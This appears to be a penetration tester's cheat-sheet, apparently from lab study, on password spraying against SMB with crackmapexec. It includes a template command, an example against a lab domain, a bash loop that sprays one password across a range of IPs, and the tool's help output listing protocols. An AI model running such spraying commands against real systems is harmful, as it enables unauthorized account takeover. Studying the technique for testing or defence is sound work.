crackmapexec smb <ip> -u <usernamelist> -p '<PASS>' -d <domain> --continue-on-success #<--- Perform several log-in tries to a SMB service in order to discover valid credentials.

#For example; crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success.

#This can be extended with a loop to a several IPs in order to explore a netowork which, often, is more common.

for i in $(seq 69 77); do crackmapexec smb 192.168.200.$i -u pete -p 'Nexus123!' -d corp.com;done

# Also, crackmapexec admits other protocols to spray:
#

kali@kali:~$ crackmapexec -h
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell] [--verbose] {smb,ssh,ftp,winrm,ldap,rdp,mssql} ...
...
options:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {smb,ssh,ftp,winrm,ldap,rdp,mssql}
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    ftp                 own stuff using FTP
    winrm               own stuff using WINRM
    ldap                own stuff using LDAP
    rdp                 own stuff using RDP
    mssql               own stuff using MSSQL
